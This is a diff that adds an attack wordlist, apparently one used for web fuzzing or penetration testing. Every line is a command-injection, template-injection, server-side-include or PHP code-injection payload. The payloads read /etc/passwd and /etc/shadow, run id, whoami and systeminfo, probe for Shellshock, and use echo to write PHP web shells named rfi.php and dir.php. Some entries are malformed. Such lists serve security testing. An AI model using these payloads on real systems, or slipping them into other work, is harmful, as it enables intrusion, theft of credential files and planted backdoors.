@@ -1,0 +1,206 @@
+{php}print “Hello”{/php}
+dir=%3Bcat%20/etc/passwd
+‘.’, 0x2E
+%24%7B1%2B1%5D
+${1+1}
+%{2*2}
+”|ls “-la
+/bin/ls|
+||ping+-c+10+127.0.0.1||
+$(sleep 7)
+`whoami`
+& $(`whoami`)
+&& $(`whoami`)
+| $(`whoami`)
+|| $(`whoami`)
+systeminfo
+;${@print(md5(RCEVulnerable))};
+${@print("RCEVulnerable")}
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id;
+\n/usr/bin/id|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`/usr/bin/id`
+|/bin/ls -al
+a);id
+a;id
+a);id;
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+; id
+%0a id %0a
+$;/usr/bin/id
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+%20{${phpinfo()}}
+| dir
+; dir
+$(`dir`)
+& dir
+&&dir
+&& dir
+| dir C:\
+; dir C:\
+& dir C:\
+&& dir C:\
+dir C:\
+| dir C:\Users
+; dir C:\Users
+& dir C:\Users
+&& dir C:\Users
+dir C:\Users
+%20{${sleep(15)}}
+| echo "<?php include($_GET['page'])| ?>" > rfi.php
+; echo "<?php include($_GET['page']); ?>" > rfi.php
+& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+echo "<?php include($_GET['page']); ?>" > rfi.php
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 15')
+eval('sleep 15');
+eval('whoami')
+eval('whoami');
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 15')
+exec('sleep 15');
+exec('whoami')
+exec('whoami');
+`id`
+|id
+| id
+;id
+;id|
+;id;
+& id
+&&id
+| ifconfig
+; ifconfig
+& ifconfig
+&& ifconfig
+| ls -l /
+; ls -l /
+& ls -l /
+&& ls -l /
+ls -l /etc/
+ls -lh /etc/
+;netstat -a;
+| netstat -an
+; netstat -an
+& netstat -an
+&& netstat -an
+\nid|
+\nid;
+\nid\n
+\n/usr/bin/id\n
+|| perl -e 'print "X"x16096'
+| perl -e 'print "X"x16096'
+; perl -e 'print "X"x16096'
+& perl -e 'print "X"x16096'
+&& perl -e 'print "X"x16096'
+|| phpinfo()
+| phpinfo()
+;phpinfo()
+;phpinfo();//
+';phpinfo();//
+{${phpinfo()}}
+& phpinfo()
+&& phpinfo()
+phpinfo()
+phpinfo();
+| pwd
+; pwd
+& pwd
+&& pwd
+| sleep 15
+; sleep 15
+& sleep 15
+&& sleep 15
+{${sleep(10)}}
+{${sleep(hexdec(dechex(20)))}
+| sysinfo
+; sysinfo
+& sysinfo
+&& sysinfo
+system('cat C:\boot.ini');
+system('cat config.php');
+| systeminfo
+; systeminfo
+& systeminfo
+&& systeminfo
+system('ls')
+system('pwd')
+system('pwd');
+|| system('sleep 15');
+| system('sleep 15');
+; system('sleep 15');
+& system('sleep 15');
+&& system('sleep 15');
+system('whoami')
+system('whoami');
+uname
+;uname;
+| uname -a
+; uname -a
+& uname -a
+&& uname -a
+uname -a
+whoami
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
